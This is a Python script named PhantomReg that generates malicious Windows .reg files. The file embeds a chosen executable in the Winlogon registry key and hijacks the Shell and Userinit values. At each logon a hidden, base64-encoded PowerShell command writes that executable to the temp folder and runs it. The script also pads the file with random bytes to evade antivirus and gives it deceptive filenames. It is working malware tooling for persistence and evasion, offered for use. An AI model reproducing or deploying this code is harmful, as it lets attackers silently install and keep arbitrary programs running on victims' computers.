import argparse
import base64
import os
from os import urandom

# Author: Rishieslab
# Description: PhantomReg is a Python-based registry exploit generator designed to inject malicious payloads into Windows startup.
# It includes a base64-encoded PowerShell payload and optional obfuscation to evade detection.

def base64encodeutf16(text):
    """
    This function encodes the input text into UTF-16LE format and then base64 encodes it. This method helps
    to hide the payload from simple text-based detection.
    """
    return base64.b64encode(text.encode("UTF-16LE")).decode()


def add_obfuscation(payload, obf_length_bytes):
    """
    Obfuscates the payload by inserting random bytes into the registry payload, making it harder for antivirus software to detect.
    The length of the obfuscation is controlled by the user in bytes.
    """
    obfuscated_payload = b""
    splited_payload = payload.split("\n")
    obf_len_per_line = int(obf_length_bytes / len(splited_payload)) if len(splited_payload) > 0 else 0

    for splited in splited_payload:
        if splited == "":
            obfuscated_payload += (b"\n" + urandom(obf_len_per_line) + b"\n")
        else:
            if splited.startswith('"'):
                splited = "\n" + splited
            obfuscated_payload += splited.encode()
    
    return obfuscated_payload


def generate_misleading_filename(base_filename, misleading_input):
    """
    Generates a misleading filename by incorporating the user-provided string into a predefined format.
    The final filename will include the misleading text and maintain the extension.
    """
    misleading_name = f"{base_filename.ljust(50)}         %r%r{misleading_input}%r%r%r%b%0.reg"
    return misleading_name


def generate_payload(file_path, obfuscate, obf_length_kb, reg_filename, misleading_name):
    """
    This function generates a .reg file that modifies the Windows registry to run a malicious payload on startup.
    The payload is base64-encoded and can be obfuscated if requested.
    """
    # Convert the obfuscation length from KB to bytes
    obf_length_bytes = obf_length_kb * 1024

    # PowerShell payload that writes a file from the registry and executes it
    onelinepayload = "[io.file]::WriteAllBytes(($env:temp+'\\out.exe'), (Get-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' -Name 'tempdata').tempdata); start ($env:temp+'\\out.exe')"
    
    # Encode the PowerShell script to hide it within the registry key
    cmdlinepayload = f"powershell -WindowStyle hidden -ec {base64encodeutf16(onelinepayload)}"

    # Registry content with two keys (`Shell` and `Userinit`) that execute the payload on startup
    payload = f"""Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]
"Shell"="explorer.exe, {cmdlinepayload}"
"Userinit"="userinit.exe, {cmdlinepayload}"
"""

    # Read the provided file and add its hex data to the registry as `tempdata`
    with open(file_path, 'rb') as f:
        data = f.read().hex(",")
    
    # Insert the hex-encoded payload into the registry string
    tempdata = '"tempdata"=hex:' + data
    payload += tempdata

    # Apply obfuscation if enabled
    if obfuscate:
        payload = add_obfuscation(payload, obf_length_bytes)

    # Determine the final file name based on whether the misleading name option is enabled
    if misleading_name:
        file_name = generate_misleading_filename(reg_filename, misleading_name)
    else:
        file_name = reg_filename if reg_filename else "malicious_payload.reg"

    # Save the final payload to a .reg file
    with open(file_name, "wb") as f:
        f.write(payload)
    
    print(f"File saved as {file_name}!")


def main():
    """
    Main function that processes command-line arguments to generate a registry payload with or without obfuscation.
    """
    parser = argparse.ArgumentParser(description="Generate a malicious registry payload")
    parser.add_argument("payload", type=str, help="Path to the payload file to be embedded in the registry")
    parser.add_argument("--obfuscate", action="store_true", help="Enable obfuscation for the payload")
    parser.add_argument("--obf_length_kb", type=int, default=256, help="Length of obfuscation in KB (default: 256 KB)")
    parser.add_argument("--reg_filename", type=str, default="monkey.reg", help="Specify the base name for the .reg file (optional, default: monkey.reg)")
    parser.add_argument("--misleading_name", type=str, default="", help="Specify a misleading name for the .reg file, e.g., 'MALWARE DETECTED!'")

    args = parser.parse_args()

    generate_payload(args.payload, args.obfuscate, args.obf_length_kb, args.reg_filename, args.misleading_name)


if __name__ == "__main__":
    main()
